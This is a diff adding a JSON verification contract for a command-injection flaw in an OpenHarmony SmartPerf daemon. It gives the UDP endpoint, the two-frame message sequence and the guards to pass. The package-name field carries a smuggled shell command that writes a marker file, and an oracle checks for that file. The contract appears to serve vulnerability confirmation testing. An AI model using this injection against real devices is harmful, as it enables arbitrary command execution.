@@ -1,0 +1,87 @@
+{
+  "schema_version": "vf.ohos.dynamic.contract.v2",
+  "contract_id": "GEN-TARGET-CMD-INJECTION-001",
+  "finding_ids": [
+    "TARGET-CMD-INJECTION-001"
+  ],
+  "unit_id": "host_smartperf_client_client_command_Dubai.cpp_Dubai__MoveDubaiDb_target-cmd-injection-001",
+  "vuln_class": "command_injection",
+  "description": "dubaiPkgName 未经校验被拼接进 shell 命令并经 popen 执行，攻击者可注入 shell 元字符执行任意命令。",
+  "entry": {
+    "kind": "hap_udp",
+    "endpoint": "127.0.0.1:8283",
+    "reachability_identity": "hap_app",
+    "evidence": ""
+  },
+  "identity": {
+    "execution_identity": "hap_app",
+    "identity_ladder_fallback": "hap_app",
+    "max_evidence_grade": "A",
+    "drop_privs": null
+  },
+  "protocol": {
+    "descriptor_id": "sp_daemon_text",
+    "field_values": {
+      "set_pkgName": "smartperf;echo \"hack by nju\" > __MARKER_PATH__;#",
+      "catch_network_traffic": "x",
+      "mode": "udp",
+      "host": "127.0.0.1",
+      "port": 8283
+    },
+    "frame_sequence": [
+      "frame_first",
+      "frame_second"
+    ],
+    "inter_frame_delay_seconds": 0.3,
+    "param_space": {
+      "frame_first_template": "set_pkgName::smartperf;echo \"hack by nju\" > __MARKER_PATH__;#",
+      "frame_second": "catch_network_traffic::x",
+      "note": "set_pkgName 原始报文及 SplitMsg 返回值均须包含大小写敏感字面量 smartperf；分号未被过滤。第二帧触发命令执行。"
+    }
+  },
+  "fault": {
+    "operator": "payload_value_substitution",
+    "description": "第一帧将 shell 注入载荷写入 dubaiPkgName，第二帧 catch_network_traffic::x 触发命令执行。",
+    "evidence": "sp_thread_socket.cpp:668-673 将满足 smartperf 守卫的 SplitMsg 返回值写入 Dubai::dubaiPkgName；Network.cpp:153 将其拼接到 pidof 命令；SPUtils::LoadCmdWithLinkBreak 直接调用 popen(cmdExc.c_str(), \"r\")。",
+    "expected_guards": [
+      "udp_token_check",
+      "set_pkgName 原始报文及 SplitMsg 返回值均包含大小写敏感字面量 smartperf",
+      "set_pkgName 与 catch_network_traffic 必须分为两帧发送，间隔约0.3秒"
+    ]
+  },
+  "oracle": {
+    "kind": "artifact_differential",
+    "artifact_forms": [
+      {
+        "form": "create",
+        "path": "__MARKER__",
+        "content_contains": "hack by nju",
+        "output_surface": "",
+        "output_is_dir": false
+      }
+    ],
+    "hilog_expectations": [],
+    "pattern_key": "run_pattern",
+    "refutation": [
+      "marker_path_unique_per_run",
+      "baseline_absent"
+    ],
+    "evidence": "注入的 echo 命令应在设备侧创建唯一 marker 文件；本轮未完成设备侧 marker 创建和读取复核。"
+  },
+  "risk": {
+    "target_process": "popen(...)",
+    "risk_tier": "unknown",
+    "crash_oracle_allowed": false,
+    "restartable": false,
+    "rationale": ""
+  },
+  "cleanup": {
+    "remote_paths": [
+      "__RUN_DIR__"
+    ],
+    "restore_actions": [],
+    "verify": []
+  },
+  "compile_status": "ELIGIBLE",
+  "limitations": []
+}
